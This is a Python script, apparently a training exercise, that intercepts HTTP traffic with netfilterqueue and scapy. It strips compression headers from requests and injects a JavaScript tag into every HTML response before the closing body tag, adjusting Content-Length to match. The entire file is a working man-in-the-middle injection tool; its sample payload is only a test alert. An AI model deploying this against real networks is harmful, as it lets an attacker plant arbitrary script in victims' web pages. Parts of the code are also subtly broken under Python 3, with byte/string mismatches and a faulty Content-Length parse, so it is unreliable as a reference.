import netfilterqueue
import scapy.all as scapy
import re
import sys
if sys.version_info < (3,):
    def b(x):
        return x
else:
    import codecs
    def b(x):
        return codecs.utf_8_encode(x)[0]

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("Request")
            #print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\r\n".encode(),"".encode(),load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("Response")
            injection_code = b("<script>alert('test');</script>")
            load = load.replace(b("</body>"), injection_code + b("</body>"))
            content_length_search = re.search("(?:Content-Length:\s)(\d*)".encode(), load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(0)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(b(str(new_packet)))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()